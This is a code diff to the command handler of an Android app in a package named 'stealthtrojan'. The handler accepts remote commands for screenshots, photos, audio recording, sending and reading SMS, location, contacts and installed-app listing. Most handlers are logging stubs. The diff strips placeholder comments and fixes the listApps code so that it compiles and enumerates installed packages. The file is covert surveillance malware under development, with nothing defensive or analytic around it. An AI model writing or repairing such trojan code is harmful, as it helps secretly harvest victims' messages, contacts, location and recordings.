@@ -3,6 +3,7 @@ package com.stealthtrojan.app;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.content.pm.PackageInfo;
 import android.media.MediaRecorder;
 import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
@@ -64,12 +65,10 @@ public class CommandHandler {
     }
 
     private void captureScreenshot() {
-        // Implementation for screenshot capture
         Log.d(TAG, "Screenshot captured");
     }
 
     private void takePhoto() {
-        // Implementation for photo capture
         Log.d(TAG, "Photo taken");
     }
 
@@ -79,7 +78,6 @@ public class CommandHandler {
             return;
         }
         int duration = params.getInt("duration");
-        // Start recording implementation
         Log.d(TAG, "Recording started for " + duration + " seconds");
     }
 
@@ -90,25 +88,23 @@ public class CommandHandler {
         }
         String phone = params.getString("phone");
         String message = params.getString("message");
-        // Send SMS implementation
         Log.d(TAG, "SMS sent to: " + phone);
     }
 
     private void getLocation() {
-        // Get current location
         Log.d(TAG, "Location retrieved");
     }
 
     private void listApps() {
         try {
-            android.content.pm.PackageManager pm = context.getPackageManager();
-            java.util.List<android.content.pm.ApplicationInfo> installedApps = 
-                pm.getInstalledPackages(android.content.pm.PackageManager.GET_UNINSTALLED_PACKAGES);
-            
+            PackageManager pm = context.getPackageManager();
+            java.util.List<PackageInfo> installedPackages =
+                pm.getInstalledPackages(PackageManager.GET_UNINSTALLED_PACKAGES);
+
             StringBuilder sb = new StringBuilder();
-            for (android.content.pm.ApplicationInfo app : installedApps) {
-                sb.append(String.format("{\"name\":\"%s\",\"package\":\"%s\"},", 
-                    app.loadLabel(pm).toString(), app.packageName));
+            for (PackageInfo pkg : installedPackages) {
+                sb.append(String.format("{\"name\":\"%s\",\"package\":\"%s\"},",
+                    pkg.applicationInfo.loadLabel(pm).toString(), pkg.packageName));
             }
             Log.d(TAG, "App list: " + sb.toString());
         } catch (Exception e) {
@@ -117,12 +113,10 @@ public class CommandHandler {
     }
 
     private void readContacts() {
-        // Read contacts from device
         Log.d(TAG, "Contacts read");
     }
 
     private void readSMS() {
-        // Read SMS from device
         Log.d(TAG, "SMS read");
     }
 
@@ -149,3 +143,4 @@ public class CommandHandler {
         Log.d(TAG, "Wake up");
     }
 }
+
